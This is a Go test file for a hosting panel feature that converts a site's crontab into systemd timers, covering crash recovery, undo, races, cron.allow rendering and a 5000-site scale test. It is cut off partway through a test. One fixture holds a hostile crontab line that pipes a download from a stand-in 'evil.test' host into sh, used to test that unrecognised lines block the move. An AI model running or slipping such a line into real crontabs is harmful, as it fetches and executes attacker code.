package main

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/alicelik/celikpanel/internal/hostingpath"
	"github.com/alicelik/celikpanel/internal/services"
	"github.com/alicelik/celikpanel/internal/sitecron"
	"github.com/alicelik/celikpanel/internal/transport"
)

// S4 R2b: a site's scheduled tasks as timers in its slice (site_tasks.go,
// site_tasks_move.go, side_doors_cron.go).

// taskTestHost is a fake systemd and cron for the tasks tests.
type taskTestHost struct {
	mu       sync.Mutex
	unitDir  string
	calls    []string
	enabled  map[string]bool
	active   map[string]bool
	crontabs map[string]string
	removes  int
	// onStep runs when a move reaches a step (racing changes).
	onCrontabRead func(account string)
}

const (
	taskTestAccount = "shop_example_test"
	taskTestSite    = 7
)

func taskTestHome() string { return hostingpath.SubscriptionsRoot() + "/2/sites/9" }

func taskTestTarget() siteTaskTarget {
	return siteTaskTarget{SiteID: taskTestSite, Domain: "shop.example.test", Account: taskTestAccount, Group: taskTestAccount, UID: 1500, GID: 1500, Home: taskTestHome()}
}

func useTaskTestHost(t *testing.T) *taskTestHost {
	t.Helper()
	useSandboxHost(t, true)
	units, _ := sandboxUnitDir()
	host := &taskTestHost{unitDir: units, enabled: map[string]bool{}, active: map[string]bool{}, crontabs: map[string]string{}}
	saved := []func(){}
	keep := func(restore func()) { saved = append(saved, restore) }
	{
		old := sitecron.SourceDir
		keep(func() { sitecron.SourceDir = old })
	}
	oldSystemctl, oldAppCtl, oldVerify, oldChown, oldCaps, oldJournal, oldLookup := siteTaskSystemctl, appUnitSystemctl, siteTaskVerify, siteTaskChown, siteTaskCaps, siteTaskJournal, siteTaskLookup
	oldList, oldInstall, oldRemove, oldLook, oldKilled, oldSupport := cronListCrontab, cronInstallCrontab, cronRemoveCrontab, cronLookPath, siteTasksMoveKilled, siteSliceHostSupport
	oldMoveJournal, oldOutcomes, oldRecords, oldTasksOutcomes := siteMoveJournalPath, siteMoveOutcomesPath, siteCrontabRecordDir, siteTasksOutcomesPath
	oldAllow, oldDeny, oldAllowRecord, oldPasswd, oldNSS, oldSpool, oldTarget := cronAllowPath, cronDenyPath, cronAllowRecordPath, sideDoorsPasswd, sideDoorsNSSwitch, siteCronSpoolDir, siteTasksTenantTarget
	keep(func() {
		siteTaskSystemctl, appUnitSystemctl, siteTaskVerify, siteTaskChown, siteTaskCaps, siteTaskJournal, siteTaskLookup = oldSystemctl, oldAppCtl, oldVerify, oldChown, oldCaps, oldJournal, oldLookup
		cronListCrontab, cronInstallCrontab, cronRemoveCrontab, cronLookPath, siteTasksMoveKilled, siteSliceHostSupport = oldList, oldInstall, oldRemove, oldLook, oldKilled, oldSupport
		siteMoveJournalPath, siteMoveOutcomesPath, siteCrontabRecordDir, siteTasksOutcomesPath = oldMoveJournal, oldOutcomes, oldRecords, oldTasksOutcomes
		cronAllowPath, cronDenyPath, cronAllowRecordPath, sideDoorsPasswd, sideDoorsNSSwitch, siteCronSpoolDir, siteTasksTenantTarget = oldAllow, oldDeny, oldAllowRecord, oldPasswd, oldNSS, oldSpool, oldTarget
	})
	t.Cleanup(func() {
		for i := len(saved) - 1; i >= 0; i-- {
			saved[i]()
		}
	})
	sitecron.SourceDir = filepath.Join(t.TempDir(), "celikpanel-cron")
	private := t.TempDir()
	siteMoveJournalPath, siteMoveOutcomesPath = filepath.Join(private, "move.json"), filepath.Join(private, "outcomes.json")
	siteTasksOutcomesPath, siteCrontabRecordDir = filepath.Join(private, "tasks-outcomes.json"), filepath.Join(private, "site-crontabs")
	etc := t.TempDir()
	cronAllowPath, cronDenyPath, cronAllowRecordPath = filepath.Join(etc, "cron.allow"), filepath.Join(etc, "cron.deny"), filepath.Join(private, "cron-allow.sha256")
	sideDoorsPasswd, sideDoorsNSSwitch, siteCronSpoolDir = filepath.Join(etc, "passwd"), filepath.Join(etc, "nsswitch.conf"), filepath.Join(etc, "crontabs")
	_ = os.MkdirAll(siteCronSpoolDir, 0o700)
	writeTaskFile(t, sideDoorsPasswd, "root:x:0:0:root:/root:/bin/bash\nanna:x:1000:1000::/home/anna:/bin/bash\n"+
		taskTestAccount+":x:1500:1500::"+taskTestHome()+":/usr/sbin/nologin\n")
	siteSliceHostSupport = func() string { return "" }
	siteTasksMoveKilled = func(string) bool { return false }
	siteTaskVerify = func(string) error { return nil }
	siteTaskChown = func(string, int, os.FileMode) error { return nil }
	siteTaskCaps = func() (bool, bool) { return true, true }
	siteTaskJournal = func(string, int) ([]string, error) { return []string{"done"}, nil }
	siteTaskLookup = func(account string) (int, int, string, string, error) {
		return 1500, 1500, account, taskTestHome(), nil
	}
	siteTasksTenantTarget = func(req *transport.SiteTasksMoveRequest) (siteTaskTarget, string, error) {
		return taskTestTarget(), taskTestAccount, nil
	}
	cronLookPath = func(string) (string, error) { return "/usr/bin/crontab", nil }
	cronListCrontab = func(username string) ([]byte, string, int, error) {
		if host.onCrontabRead != nil {
			host.onCrontabRead(username)
		}
		host.mu.Lock()
		defer host.mu.Unlock()
		content, ok := host.crontabs[username]
		if !ok {
			return nil, "no crontab for " + username, 1, errors.New("exit status 1")
		}
		return []byte(content), "", 0, nil
	}
	cronInstallCrontab = func(username, content string) error {
		host.mu.Lock()
		defer host.mu.Unlock()
		host.crontabs[username] = content
		return nil
	}
	cronRemoveCrontab = func(username string) error {
		host.mu.Lock()
		defer host.mu.Unlock()
		delete(host.crontabs, username)
		host.removes++
		return nil
	}
	ctl := func(args ...string) ([]byte, error) {
		host.mu.Lock()
		defer host.mu.Unlock()
		host.calls = append(host.calls, strings.Join(args, " "))
		switch {
		case len(args) >= 2 && args[0] == "enable":
			unit := args[len(args)-1]
			host.enabled[unit] = true
			if args[1] == "--now" {
				host.active[unit] = true
			}
		case len(args) >= 3 && args[0] == "disable":
			delete(host.enabled, args[2])
			delete(host.active, args[2])
		case args[0] == "show":
			var b strings.Builder
			for _, name := range args[3:] {
				fmt.Fprintf(&b, "Id=%s\n", name)
				if strings.HasSuffix(name, ".timer") {
					loaded := "not-found"
					if _, err := os.Stat(filepath.Join(host.unitDir, name)); err == nil {
						loaded = "loaded"
					}
					state, active := "disabled", "inactive"
					if host.enabled[name] {
						state = "enabled"
					}
					if host.active[name] {
						active = "active"
					}
					fmt.Fprintf(&b, "LoadState=%s\nActiveState=%s\nUnitFileState=%s\nNextElapseUSecRealtime=@1795300000\n\n", loaded, active, state)
				} else {
					fmt.Fprintf(&b, "ActiveState=inactive\nResult=success\nExecMainStartTimestamp=@1795287180\nExecMainExitTimestamp=@1795287182\nExecMainStatus=0\nInvocationID=abc\n\n")
				}
			}
			return []byte(b.String()), nil
		}
		return nil, nil
	}
	siteTaskSystemctl = ctl
	appUnitSystemctl = ctl
	return host
}

func writeTaskFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func readTaskFile(t *testing.T, path string) string {
	t.Helper()
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("%s: %v", path, err)
	}
	return string(raw)
}

func (h *taskTestHost) unitFiles(t *testing.T) []string {
	t.Helper()
	entries, _ := os.ReadDir(h.unitDir)
	var out []string
	for _, e := range entries {
		if strings.HasPrefix(e.Name(), "celikcron-") {
			out = append(out, e.Name())
		}
	}
	sort.Strings(out)
	return out
}

func (h *taskTestHost) count(prefix string) int {
	h.mu.Lock()
	defer h.mu.Unlock()
	n := 0
	for _, c := range h.calls {
		if strings.HasPrefix(c, prefix) {
			n++
		}
	}
	return n
}

// TestSiteTimersRenderOnlyWhatChangedAndKeepNumbers: a site's timers come
// from its task file; a second apply writes and enables nothing; a changed
// task gets a new number and the old one is stopped, disabled and removed;
// the command lives in the task's file, never in the unit; a unit the owner
// changed is kept, never overwritten or removed.
func TestSiteTimersRenderOnlyWhatChangedAndKeepNumbers(t *testing.T) {
	host := useTaskTestHost(t)
	target := taskTestTarget()
	crontab := "PATH=/usr/local/bin:/usr/bin:/bin\n17 3 * * * php artisan schedule:run\n*/30 * * * * od -c > out%secret input\n@reboot /usr/bin/true\n"
	if _, err := applySiteTimers(target, crontab); err != nil {
		t.Fatal(err)
	}
	want := []string{"celikcron-7-1.service", "celikcron-7-1.timer", "celikcron-7-2.service", "celikcron-7-2.timer", "celikcron-7-3.service", "celikcron-7-3.timer"}
	if got := host.unitFiles(t); strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("units %v", got)
	}
	service := readTaskFile(t, filepath.Join(host.unitDir, "celikcron-7-2.service"))
	if strings.Contains(service, "od -c") || strings.Contains(service, "secret") || !strings.Contains(service, "ExecStart=/bin/sh "+sitecron.ScriptPath(7, 2)) ||
		!strings.Contains(service, "StandardInput=file:"+sitecron.InputPath(7, 2)) || !strings.Contains(service, "EnvironmentFile="+sitecron.EnvPath(7)) {
		t.Fatalf("service:\n%s", service)
	}
	if script := readTaskFile(t, sitecron.ScriptPath(7, 2)); !strings.HasSuffix(script, "\nod -c > out\n") {
		t.Fatalf("script %q", script)
	}
	if input := readTaskFile(t, sitecron.InputPath(7, 2)); input != "secret input\n" {
		t.Fatalf("input %q", input)
	}
	if !host.enabled["celikcron-7-1.timer"] || !host.active["celikcron-7-1.timer"] || !host.enabled["celikcron-7-3.timer"] || host.active["celikcron-7-3.timer"] {
		t.Fatalf("enable: %v / %v (an @reboot timer is enabled, not started)", host.enabled, host.active)
	}
	reloads, enables := host.count("daemon-reload"), host.count("enable")
	if _, err := applySiteTimers(target, crontab); err != nil {
		t.Fatal(err)
	}
	if host.count("daemon-reload") != reloads || host.count("enable") != enables {
		t.Fatalf("a second apply changed something: %v", host.calls)
	}
	// The owner turns task 1 off; a later change of another task keeps it off.
	host.enabled["celikcron-7-1.timer"], host.active["celikcron-7-1.timer"] = false, false
	changed := strings.Replace(crontab, "*/30 * * * *", "*/15 * * * *", 1)
	if _, err := applySiteTimers(target, changed); err != nil {
		t.Fatal(err)
	}
	if host.enabled["celikcron-7-1.timer"] {
		t.Fatal("the owner's disabled timer was enabled again")
	}
	if _, err := os.Stat(filepath.Join(host.unitDir, "celikcron-7-2.timer")); !os.IsNotExist(err) {
		t.Fatal("the changed task kept its old timer")
	}
	if !host.enabled["celikcron-7-4.timer"] || host.count("disable --now celikcron-7-2.timer") != 1 {
		t.Fatalf("new number / old disabled: %v", host.calls)
	}
	if _, err := os.Stat(sitecron.InputPath(7, 2)); !os.IsNotExist(err) {
		t.Fatal("the old task's input stayed")
	}
	// The owner edits task 1's timer: it is kept when its task goes.
	timer1 := filepath.Join(host.unitDir, "celikcron-7-1.timer")
	writeTaskFile(t, timer1, readTaskFile(t, timer1)+"# mine\n")
	without := strings.Replace(changed, "17 3 * * * php artisan schedule:run\n", "", 1)
	result, err := applySiteTimers(target, without)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(timer1); err != nil || !strings.HasSuffix(readTaskFile(t, timer1), "# mine\n") || len(result.Kept) == 0 {
		t.Fatalf("the owner's timer was not kept: %v %+v", err, result)
	}
}

// moveTaskCrontab is a crontab the panel wrote: its MAILTO lines, a task, a
// paused task, a setting and the owner's kept @reboot line are all moved.
const moveTaskCrontab = cronMailtoComment + "\nMAILTO=\"\"\n# nightly report\n17 3 * * * php report.php\n# DISABLED: */5 * * * * curl -s https://example.test/\n"

func recordPanelCrontab(t *testing.T, content string) {
	t.Helper()
	if err := writeSiteCrontabRecord(taskTestAccount, siteCrontabRecordAfter(taskTestAccount, "", content, cronSplitLines(content))); err != nil {
		t.Fatal(err)
	}
}

// TestTasksMoveSurvivesAnAgentStopAtEveryStep: the Agent stops right after
// each step; at its next start the journal finishes or puts back the move by
// its step, the crontab is never lost and no timer runs while the crontab
// still has the line.
func TestTasksMoveSurvivesAnAgentStopAtEveryStep(t *testing.T) {
	cases := []struct {
		step        string
		wantCrontab bool // the crontab holds the tasks afterwards
		wantTimers  bool
		wantOutcome string
	}{
		{siteTasksStepPlanned, true, false, "not_tried"},
		{siteTasksStepSourceWritten, true, false, transport.SiteTasksPutBack},
		{siteTasksStepUnitsWritten, true, false, transport.SiteTasksPutBack},
		{siteTasksStepCrontabEmptied, false, true, transport.SiteTasksMoved},
		{siteTasksStepEnabled, false, true, transport.SiteTasksMoved},
	}
	for _, tc := range cases {
		t.Run(tc.step, func(t *testing.T) {
			host := useTaskTestHost(t)
			host.crontabs[taskTestAccount] = moveTaskCrontab
			recordPanelCrontab(t, moveTaskCrontab)
			siteTasksMoveKilled = func(step string) bool { return step == tc.step }
			var resp transport.SiteTasksMoveResponse
			_ = (&Agent{}).MoveSiteTasksV1(&transport.SiteTasksMoveRequest{CronTenant: transport.CronTenant{SiteID: taskTestSite}}, &resp)
			if resp.Outcome != transport.SiteTasksUnknown {
				t.Fatalf("the stopped move answered %+v", resp)
			}
			if tc.step == siteTasksStepUnitsWritten && host.active["celikcron-7-1.timer"] {
				t.Fatal("a timer was started before the crontab was empty")
			}
			siteTasksMoveKilled = func(string) bool { return false }
			recoverSiteSlicesAtStartup()
			if _, err := os.Stat(siteMoveJournalPath); !os.IsNotExist(err) {
				t.Fatal("the journal stayed")
			}
			if got := host.crontabs[taskTestAccount]; (got == moveTaskCrontab) != tc.wantCrontab || (!tc.wantCrontab && got != "") {
				t.Fatalf("crontab %q", got)
			}
			hasTimers := len(host.unitFiles(t)) > 0
			if hasTimers != tc.wantTimers || (tc.wantTimers && !host.active["celikcron-7-1.timer"]) {
				t.Fatalf("timers %v active %v", host.unitFiles(t), host.active)
			}
			if _, err := os.Stat(sitecron.SourcePath(7)); (err == nil) != tc.wantTimers {
				t.Fatalf("task file: %v", err)
			}
			if tc.step != siteTasksStepPlanned {
				if got := readSiteTasksOutcomes()["7"]; !strings.HasSuffix(got, " "+tc.wantOutcome) {
					t.Fatalf("recorded outcome %q, want %s", got, tc.wantOutcome)
				}
			}
		})
	}
}

// TestTasksMoveAndUndoKeepTheCrontabByteForByte: the move empties the
// crontab only after the timers are written, keeps the crontab's bytes in
// the task file, and the undo writes exactly those bytes back and removes
// every timer and file.
func TestTasksMoveAndUndoKeepTheCrontabByteForByte(t *testing.T) {
	host := useTaskTestHost(t)
	host.crontabs[taskTestAccount] = moveTaskCrontab
	recordPanelCrontab(t, moveTaskCrontab)
	var preview transport.SiteTasksMoveResponse
	_ = (&Agent{}).MoveSiteTasksV1(&transport.SiteTasksMoveRequest{CronTenant: transport.CronTenant{SiteID: taskTestSite}, Preview: true}, &preview)
	if preview.Outcome != transport.SiteTasksPreview || len(preview.Rows) != 3 || preview.Rows[1].Unit != "celikcron-7-1" || !preview.Rows[2].Paused {
		t.Fatalf("preview %+v", preview)
	}
	if len(host.unitFiles(t)) != 0 || host.crontabs[taskTestAccount] != moveTaskCrontab {
		t.Fatal("the preview changed something")
	}
	var resp transport.SiteTasksMoveResponse
	_ = (&Agent{}).MoveSiteTasksV1(&transport.SiteTasksMoveRequest{CronTenant: transport.CronTenant{SiteID: taskTestSite}}, &resp)
	if resp.Outcome != transport.SiteTasksMoved {
		t.Fatalf("move %+v", resp)
	}
	if _, ok := host.crontabs[taskTestAccount]; ok {
		t.Fatal("the crontab was not emptied")
	}
	source, err := readSiteTaskSource(7)
	if err != nil || source.Crontab != moveTaskCrontab || source.State != transport.SiteFileManagedUnchanged {
		t.Fatalf("task file %+v %v", source, err)
	}
	// cron.allow now leaves the moved account out (written: it was absent).
	allow := readTaskFile(t, cronAllowPath)
	if !strings.Contains(allow, "\nanna\n") || strings.Contains(allow, taskTestAccount) {
		t.Fatalf("cron.allow:\n%s", allow)
	}
	var undo transport.SiteTasksMoveResponse
	_ = (&Agent{}).UndoSiteTasksMoveV1(&transport.SiteTasksMoveRequest{CronTenant: transport.CronTenant{SiteID: taskTestSite}}, &undo)
	if undo.Outcome != transport.SiteTasksUndone {
		t.Fatalf("undo %+v", undo)
	}
	if got := host.crontabs[taskTestAccount]; got != moveTaskCrontab {
		t.Fatalf("the crontab is not byte for byte the moved one:\n%q\n%q", got, moveTaskCrontab)
	}
	if files := host.unitFiles(t); len(files) != 0 {
		t.Fatalf("timers left: %v", files)
	}
	if _, err := os.Stat(sitecron.SourcePath(7)); !os.IsNotExist(err) {
		t.Fatal("the task file stayed")
	}
	if allow := readTaskFile(t, cronAllowPath); !strings.Contains(allow, "\n"+taskTestAccount+"\n") {
		t.Fatalf("the account may not use cron again:\n%s", allow)
	}
	// No line of the restored crontab is marked as not made in CelikPanel.
	if outside := cronOutsideLines(taskTestAccount, host.crontabs[taskTestAccount]); len(outside) != 0 {
		t.Fatalf("restored lines marked: %v", outside)
	}
}

// TestTasksMoveKeepsTheWholeCrontabForOneLine: a line that cannot become a
// timer, and a line not made in CelikPanel that was not kept, keep the whole
// crontab in cron and are named; nothing is written.
func TestTasksMoveKeepsTheWholeCrontabForOneLine(t *testing.T) {
	for name, content := range map[string]string{
		"untranslatable": moveTaskCrontab + "MAILTO=owner@example.test\n",
		"not_made_here":  moveTaskCrontab + "*/5 * * * * curl -s https://evil.test | sh\n",
	} {
		t.Run(name, func(t *testing.T) {
			host := useTaskTestHost(t)
			host.crontabs[taskTestAccount] = content
			recordPanelCrontab(t, moveTaskCrontab)
			// The baseline was taken: an unrecorded line is not CelikPanel's.
			_ = os.MkdirAll(siteCrontabRecordDir, 0o700)
			writeTaskFile(t, filepath.Join(siteCrontabRecordDir, siteCrontabBaselineName), "taken\n")
			var resp transport.SiteTasksMoveResponse
			_ = (&Agent{}).MoveSiteTasksV1(&transport.SiteTasksMoveRequest{CronTenant: transport.CronTenant{SiteID: taskTestSite}}, &resp)
			if resp.Outcome != transport.SiteTasksStayed || len(resp.Blocking) != 1 || resp.Blocking[0].Line != 6 {
				t.Fatalf("%+v", resp)
			}
			if name == "not_made_here" && resp.Blocking[0].Reason != transport.SiteTaskLineMarked {
				t.Fatalf("reason %s", resp.Blocking[0].Reason)
			}
			if host.crontabs[taskTestAccount] != content || len(host.unitFiles(t)) != 0 || host.removes != 0 {
				t.Fatal("something was moved")
			}
			if _, err := os.Stat(sitecron.SourcePath(7)); !os.IsNotExist(err) {
				t.Fatal("a task file was written")
			}
		})
	}
}

// TestTasksMoveRacesATaskChangeAndADeletion: a crontab changed while the
// move runs is never lost (the move is put back); a site being deleted is
// not moved; a deletion after an interrupted move is never undone by the
// recovery (nothing is re-created).
func TestTasksMoveRacesATaskChangeAndADeletion(t *testing.T) {
	host := useTaskTestHost(t)
	host.crontabs[taskTestAccount] = moveTaskCrontab
	recordPanelCrontab(t, moveTaskCrontab)
	changed := moveTaskCrontab + "0 4 * * * php other.php\n"
	reads := 0
	host.onCrontabRead = func(string) {
		reads++
		if reads == 2 { // the read just before the crontab is emptied
			host.mu.Lock()
			host.crontabs[taskTestAccount] = changed
			host.mu.Unlock()
		}
	}
	var resp transport.SiteTasksMoveResponse
	_ = (&Agent{}).MoveSiteTasksV1(&transport.SiteTasksMoveRequest{CronTenant: transport.CronTenant{SiteID: taskTestSite}}, &resp)
	if resp.Outcome != transport.SiteTasksPutBack || resp.Refusal != transport.SiteTasksRefusalCrontab {
		t.Fatalf("%+v", resp)
	}
	if host.crontabs[taskTestAccount] != changed || len(host.unitFiles(t)) != 0 || host.removes != 0 {
		t.Fatalf("the change was lost or a timer stayed: %q %v", host.crontabs[taskTestAccount], host.unitFiles(t))
	}
	host.onCrontabRead = nil

	// A site being deleted (its lock held) is not moved.
	lock := siteMutationMutex(taskTestSite)
	lock.Lock()
	_ = (&Agent{}).MoveSiteTasksV1(&transport.SiteTasksMoveRequest{CronTenant: transport.CronTenant{SiteID: taskTestSite}}, &resp)
	lock.Unlock()
	if resp.Refusal != transport.SiteTasksRefusalBusy || len(host.unitFiles(t)) != 0 {
		t.Fatalf("moved a site being deleted: %+v", resp)
	}

	// Interrupted after the timers were written, then the site is deleted:
	// the recovery re-creates nothing and leaves the crontab alone.
	host.crontabs[taskTestAccount] = moveTaskCrontab
	siteTasksMoveKilled = func(step string) bool { return step == siteTasksStepUnitsWritten }
	_ = (&Agent{}).MoveSiteTasksV1(&transport.SiteTasksMoveRequest{CronTenant: transport.CronTenant{SiteID: taskTestSite}}, &resp)
	siteTasksMoveKilled = func(string) bool { return false }
	if _, err := removeSiteTasks(taskTestSite); err != nil {
		t.Fatal(err)
	}
	delete(host.crontabs, taskTestAccount) // the account went with the site
	recoverSiteSlicesAtStartup()
	if len(host.unitFiles(t)) != 0 {
		t.Fatalf("the recovery re-created timers: %v", host.unitFiles(t))
	}
	if _, err := os.Stat(sitecron.SourcePath(7)); !os.IsNotExist(err) {
		t.Fatal("the recovery re-created the task file")
	}
}

// TestMovedSiteTaskChangesGoToTheTaskFile: after the move, the screen's
// change built from the last list (same version: the task file holds the
// crontab's bytes) is applied to the task file and its timers; an owner's
// edit of the task file is kept and used, and the panel's change waits
// beside it.
func TestMovedSiteTaskChangesGoToTheTaskFile(t *testing.T) {
	host := useTaskTestHost(t)
	host.crontabs[taskTestAccount] = moveTaskCrontab
	recordPanelCrontab(t, moveTaskCrontab)
	version := cronVersion(moveTaskCrontab)
	var resp transport.SiteTasksMoveResponse
	_ = (&Agent{}).MoveSiteTasksV1(&transport.SiteTasksMoveRequest{CronTenant: transport.CronTenant{SiteID: taskTestSite}}, &resp)
	if resp.Outcome != transport.SiteTasksMoved {
		t.Fatalf("%+v", resp)
	}
	store := siteTaskStore(taskTestTarget())
	if err := addCronJobIn(store, taskTestAccount, &AddCronJobRequest{Schedule: "0 5 * * *", Command: "php five.php", Version: version}); err != nil {
		t.Fatal(err)
	}
	source, _ := readSiteTaskSource(7)
	if !strings.HasSuffix(source.Crontab, "0 5 * * * php five.php\n") || strings.Count(source.Crontab, "MAILTO") != 1 {
		t.Fatalf("task file:\n%s", source.Crontab)
	}
	if !host.enabled["celikcron-7-2.timer"] {
		t.Fatalf("the new task got no timer: %v", host.enabled)
	}
	if _, ok := host.crontabs[taskTestAccount]; ok {
		t.Fatal("a crontab was written for a moved site")
	}
	var list ListCronJobsResponse
	if err := listSiteTasks(taskTestTarget(), &list); err != nil {
		t.Fatal(err)
	}
	if !list.Timers || list.Source != transport.SiteTasksSourceOurs || list.Jobs[0].Unit != "celikcron-7-1" || list.Jobs[0].Run == nil ||
		list.Jobs[0].Run.State != "succeeded" || list.Jobs[0].Run.Seconds != 2 || list.Jobs[0].TaskState != transport.SiteTaskScheduled {
		t.Fatalf("list %+v %+v", list, list.Jobs[0].Run)
	}
	// The owner edits the task file by hand.
	path := sitecron.SourcePath(7)
	writeTaskFile(t, path, readTaskFile(t, path)+"0 6 * * * php owner.php\n")
	list = ListCronJobsResponse{}
	_ = listSiteTasks(taskTestTarget(), &list)
	err := addCronJobIn(store, taskTestAccount, &AddCronJobRequest{Schedule: "0 7 * * *", Command: "php seven.php", Version: list.Version})
	if err == nil || err.Error() != transport.SiteTasksSourceHeld {
		t.Fatalf("an owner's task file was not kept: %v", err)
	}
	if !strings.HasSuffix(readTaskFile(t, path), "0 6 * * * php owner.php\n") {
		t.Fatal("the owner's edit was overwritten")
	}
	if _, err := os.Stat(path + services.SiteFilePendingSuffix); err != nil {
		t.Fatalf("the panel's change was not put beside it: %v", err)
	}
	if list.Source != transport.SiteTasksSourceOwner {
		t.Fatalf("source %s", list.Source)
	}
	// Undo is refused before anything changes.
	var undo transport.SiteTasksMoveResponse
	_ = (&Agent{}).UndoSiteTasksMoveV1(&transport.SiteTasksMoveRequest{CronTenant: transport.CronTenant{SiteID: taskTestSite}}, &undo)
	if undo.Refusal != transport.SiteTasksRefusalSource || len(host.unitFiles(t)) == 0 {
		t.Fatalf("undo %+v", undo)
	}
}

// TestCronAllowRendering: everyone who may use crontab today keeps it,
// minus moved sites' accounts, tool accounts and logins sharing a site's id;
// a site not yet moved stays allowed; the owner's file is kept and a moved
// account it names is reported; the owner's deletion stands; accounts from a
// directory service: nothing is written.
func TestCronAllowRendering(t *testing.T) {
	useTaskTestHost(t)
	root := hostingpath.SubscriptionsRoot()
	entries := []passwdEntry{
		{Name: "root", UID: 0, Home: "/root"},
		{Name: "anna", UID: 1000, Home: "/home/anna"},
		{Name: "bob", UID: 1001, Home: "/home/bob"},
		{Name: "moved_site", UID: 2000, Home: root + "/1/sites/1"},
		{Name: "moved-ftp", UID: 2000, Home: "/run/celikpanel-ftp/moved-ftp/./files"},
		{Name: "other_site", UID: 2001, Home: root + "/1/sites/2"},
		{Name: "other-ftp", UID: 2001, Home: "/run/celikpanel-ftp/other-ftp/./files"},
		{Name: phpToolAccount("webmail"), UID: 999, Home: "/var/lib/celikpanel-php-tools/webmail"},
	}
	got := renderCronAllow(entries, "bob\n", map[string]bool{"moved_site": true})
	names := nameLines(strings.TrimPrefix(got, cronAllowHeader))
	if strings.Join(names, ",") != "root,anna,other_site" {
		t.Fatalf("cron.allow names %v", names)
	}

	// The checks with a moved site on disk.
	writeTaskFile(t, sideDoorsPasswd, "root:x:0:0::/root:/bin/bash\nanna:x:1000:1000::/home/anna:/bin/bash\n"+
		"moved-ftp:x:1500:1500::/run/celikpanel-ftp/moved-ftp/./files:/usr/sbin/nologin\n"+
		taskTestAccount+":x:1500:1500::"+taskTestHome()+":/usr/sbin/nologin\n")
	ops := hostSiteCronOps()
	if out := closeSiteCronWith(ops, 0); out.State != transport.SideDoorsCronNotNeeded {
		t.Fatalf("no moved site: %+v", out)
	}
	if _, err := writeSiteTaskSource(taskTestTarget(), "", transport.SiteFileTriggerCreate); err != nil {
		t.Fatal(err)
	}
	if out := closeSiteCronWith(ops, 0); out.State != transport.SideDoorsAtWritten {
		t.Fatalf("first write: %+v", out)
	}
	if out := closeSiteCronWith(ops, 0); out.State != transport.SideDoorsAtCurrent {
		t.Fatalf("second: %+v", out)
	}
	// The owner's file names the moved account and its login: kept, reported.
	owner := "root\nanna\n" + taskTestAccount + "\nmoved-ftp\n"
	writeTaskFile(t, cronAllowPath, owner)
	out := closeSiteCronWith(ops, 0)
	if out.State != transport.SideDoorsAtOwnerFile || strings.Join(out.SiteAccounts, ",") != "moved-ftp,"+taskTestAccount || readTaskFile(t, cronAllowPath) != owner {
		t.Fatalf("owner file: %+v", out)
	}
	if why := cronAllowRefuses("nobody_here", taskTestSite); why == "" {
		t.Fatal("the undo was not refused for an account the owner's file leaves out")
	}
	// The owner deletes CelikPanel's file: it stays deleted.
	_ = os.Remove(cronAllowPath)
	if out := closeSiteCronWith(ops, 0); out.State != transport.SideDoorsAtOwnerRemoved {
		t.Fatalf("owner removed: %+v", out)
	}
	if _, err := os.Stat(cronAllowPath); !os.IsNotExist(err) {
		t.Fatal("the owner's deletion was undone")
	}
	// Re-close forgets the record; a directory service then writes nothing.
	_ = os.Remove(cronAllowRecordPath)
	writeTaskFile(t, sideDoorsNSSwitch, "passwd: files ldap\n")
	if out := closeSiteCronWith(ops, 0); out.State != transport.SideDoorsAtDirectory {
		t.Fatalf("directory: %+v", out)
	}
	// A crontab that came back for the moved account is reported.
	writeTaskFile(t, filepath.Join(siteCronSpoolDir, taskTestAccount), "# DO NOT EDIT THIS FILE\n* * * * * planted\n")
	if out := closeSiteCronWith(ops, 0); out.Reappeared[taskTestAccount] != 1 {
		t.Fatalf("reappeared: %+v", out)
	}
}

// TestFiveThousandSites: cron.allow for 5000 site accounts (half moved) and
// the moved list of 5000 task files are made quickly, and the crontab count
// never runs `crontab -l` for a moved account.
func TestFiveThousandSites(t *testing.T) {
	useTaskTestHost(t)
	root := hostingpath.SubscriptionsRoot()
	var passwd strings.Builder
	passwd.WriteString("root:x:0:0::/root:/bin/bash\n")
	entries := []passwdEntry{{Name: "root", Home: "/root"}}
	moved := map[string]bool{}
	for i := 1; i <= 5000; i++ {
		name := fmt.Sprintf("site_%d", i)
		home := fmt.Sprintf("%s/%d/sites/%d", root, i, i)
		entries = append(entries, passwdEntry{Name: name, UID: 10000 + i, Home: home})
		fmt.Fprintf(&passwd, "%s:x:%d:%d::%s:/usr/sbin/nologin\n", name, 10000+i, 10000+i, home)
		if i%2 == 0 {
			moved[name] = true
			target := siteTaskTarget{SiteID: i, Domain: fmt.Sprintf("s%d.example.test", i), Account: name, Group: name, GID: 10000 + i, Home: home}
			if _, err := writeSiteTaskSource(target, "", transport.SiteFileTriggerCreate); err != nil {
				t.Fatal(err)
			}
		}
	}
	start := time.Now()
	text := renderCronAllow(entries, "", moved)
	if n := len(nameLines(strings.TrimPrefix(text, cronAllowHeader))); n != 2501 {
		t.Fatalf("%d names", n)
	}
	ids, accounts := movedSiteTaskSites()
	if len(ids) != 2500 || accounts[5000] != "site_5000" {
		t.Fatalf("%d moved, %q", len(ids), accounts[5000])
	}
	if d := time.Since(start); d > 20*time.Second {
		t.Fatalf("took %v", d)
	}
	writeTaskFile(t, sideDoorsPasswd, passwd.String())
	lists := 0
	cronListCrontab = func(username string) ([]byte, string, int, error) {
		lists++
		if moved[username] {
			t.Errorf("crontab -l for moved account %s", username)
		}
		return nil, "no crontab for " + username, 1, errors.New("exit status 1")
	}
	oldAccounts := siteCrontabAccounts
	t.Cleanup(func() { siteCrontabAccounts = oldAccounts })
	siteCrontabAccounts = func() ([]passwdEntry, error) {
		var sites []passwdEntry
		for _, e := range entries[1:] {
			sites = append(sites, e)
		}
		return sites, nil
	}
	checkSiteCrontabs()
	if lists != 2500 {
		t.Fatalf("%d crontab reads, want 2500", lists)
	}
}

// TestLingerRuleAndAccounts: where polkitd is installed the rules file names
// only the administrator groups that exist; a site account that lingers is
// named (never changed); the owner's deletion of the file stands.
func TestLingerRuleAndAccounts(t *testing.T) {
	useTaskTestHost(t)
	oldRules, oldLinger, oldGroup := polkitRulesDir, lingerDir, sideDoorsGroup
